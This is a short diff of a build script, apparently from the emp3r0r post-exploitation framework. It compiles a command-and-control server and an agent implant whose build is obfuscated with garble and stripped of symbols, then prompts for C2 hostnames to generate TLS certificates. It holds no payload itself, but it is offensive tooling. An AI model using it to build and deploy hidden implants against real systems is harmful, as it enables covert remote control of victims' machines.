@@ -28,9 +28,23 @@ pwd="$(pwd)"
     cd cmd/cc && go build -o "$pwd/cc.exe"
     cd "$pwd" &&
         cd cmd/cat && go build -o "$pwd/cat.exe"
-    cd "$pwd" &&
-        cd cmd/agent && garble -literals -tiny build -o "$pwd/stub.exe" -ldflags='-s -w -v'
 )
+
+cd "$pwd" || {
+    echo "WTF? cd $pwd"
+    exit 1
+}
+[[ -f stub.exe ]] || {
+    (
+        cd cmd/agent && garble -tiny build -o "$pwd/stub.exe" -ldflags='-s -w -v'
+    ) || exit 1
+}
+
+{ [[ -f emp3r0r-cert.pem ]] && [[ -f emp3r0r-key.pem ]]; } || {
+    echo -ne "CC names (can be IPs and/or domain names), separate with space:\n>> "
+    read -r hosts
+    ./cc.exe -gencert "$hosts"
+}
 
 (
     cp -r ./tmux/sh /tmp
